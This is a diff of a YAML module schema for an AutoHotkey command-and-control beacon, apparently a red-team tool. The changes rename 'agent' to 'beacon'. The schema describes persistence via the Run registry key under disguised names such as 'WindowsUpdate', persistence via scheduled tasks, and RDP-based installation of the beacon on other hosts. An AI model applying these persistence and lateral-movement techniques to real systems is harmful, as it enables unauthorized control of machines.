@@ -1,9 +1,8 @@
-# Default Windows Agent Module Schema
-# Based on current hardcoded modules in command_widget.py
+# Default AutoHotkey beacon schema
 
-schema_version: "1.0"
-agent_info:
-  agent_type: "autohotkey_beacon"
+schema_version: "1.1"
+beacon_info:
+  beacon_type: "autohotkey_beacon"
   version: "1.0.0"
   description: "Default AutoHotkey C2 beacon"
   supported_platforms: ["windows"]
@@ -420,7 +419,7 @@ categories:
 
       add_startup_to_registry:
         display_name: "Add Startup to Registry"
-        description: "Add the agent script to the user's CurrentVersion\\Run registry"
+        description: "Add the beacon script to the user's CurrentVersion\\Run registry"
         command_template: "execute_module|AddScriptToRegistry|{key_name}"
         parameters:
           key_name:
@@ -433,7 +432,7 @@ categories:
               min_length: 1
               max_length: 64
         documentation:
-          content: "Adds the agent script to the user's CurrentVersion\\Run registry for persistence."
+          content: "Adds the beacon script to the user's CurrentVersion\\Run registry for persistence."
           examples:
             - "StartUp"
             - "WindowsUpdate"
@@ -476,7 +475,7 @@ categories:
               min_value: 1
               max_value: 1000
         documentation:
-          content: "Adds a recurring scheduled task. With inputs empty, it will add task to launch the agent."
+          content: "Adds a recurring scheduled task. With inputs empty, it will add task to launch the beacon."
           examples:
             - "ScheduledTask / App.exe / 1"
         execution:
@@ -539,7 +538,7 @@ categories:
 
       rdp_connection:
         display_name: "RDP Connection"
-        description: "Connect to a host via RDP and install the agent"
+        description: "Connect to a host via RDP and install the beacon"
         command_template: "execute_module|RDPConnect|{hostname},{username},{password},{server_ip},{domain}"
         parameters:
           hostname:
@@ -572,7 +571,7 @@ categories:
           server_ip:
             type: "text"
             display_name: "C2 Server IP"
-            description: "This is the IP you want the new agent to connect to"
+            description: "This is the IP you want the new beacon to connect to"
             required: true
             default: "192.168.124.22"
             validation:
@@ -587,7 +586,7 @@ categories:
             validation:
               max_length: 64
         documentation:
-          content: "Connects to a host via RDP and installs the agent on the target system."
+          content: "Connects to a host via RDP and installs the beacon on the target system."
           examples:
             - "192.168.1.100 / admin / password / 192.168.1.50 / domain.local"
         execution:
